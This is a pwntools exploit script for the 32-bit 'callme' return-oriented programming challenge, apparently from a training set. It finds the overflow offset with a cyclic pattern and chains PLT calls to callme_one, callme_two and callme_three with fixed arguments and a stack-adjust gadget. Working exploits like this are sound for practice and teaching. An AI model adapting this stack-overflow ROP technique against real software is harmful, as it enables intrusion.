import syslog

from pwn import *
#context.log_level = "DEBUG"

elf = ELF('./callme32')
#lib = ELF('./libcallme32.so')
p = process('./callme32')

# find offset
g = cyclic_gen()
t = g.get(100)
p.recvuntil(b'>')
p.sendline(t)
p.recvall()
eip = b'\x61\x61\x61\x6c'
eip = hex(unpack(eip, 32))
eip = bytes.fromhex(eip[2:]).decode()
offset = g.find(eip)[0]
log.info(f'offset: {offset}')
p.close()

# start exploit
args0 = pack(0xdeadbeef, 32, 'little')
args1 = pack(0xcafebabe, 32, 'little')
args2 = pack(0xd00df00d, 32, 'little')
callme_one = pack(elf.plt['callme_one'], 32, 'little')
callme_two = pack(elf.plt['callme_two'], 32, 'little')
callme_three = pack(elf.plt['callme_three'], 32, 'little')
adjust = pack(0x80484aa, 32, 'little') # add esp, 8; pop ebx; ret
payload = [                            # if don't understant you can see the picture
    b'A' * offset,
    callme_one,
    adjust,
    args0,
    args1,
    args2,
    callme_two,
    adjust,
    args0,
    args1,
    args2,
    callme_three,
    b'BBBB',
    args0,
    args1,
    args2,
]
payload = b"".join(payload)

p = process('./callme32')
p.recvuntil(b'>')
p.sendline(payload)
log.success(p.recvline().decode())
log.success(p.recvline().decode())
log.success(p.recvline().decode())
log.success(p.recvline().decode())


